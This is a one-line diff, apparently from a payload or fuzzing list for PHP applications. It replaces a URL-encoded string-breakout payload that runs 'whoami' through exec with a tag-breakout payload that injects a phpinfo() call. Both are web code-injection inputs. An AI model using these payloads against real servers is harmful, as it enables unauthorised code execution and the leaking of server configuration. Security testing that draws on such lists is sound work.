@@ -1,1 +1,1 @@
-";%20echo%20exec('whoami');%20//
+?><?php phpinfo(); ?>
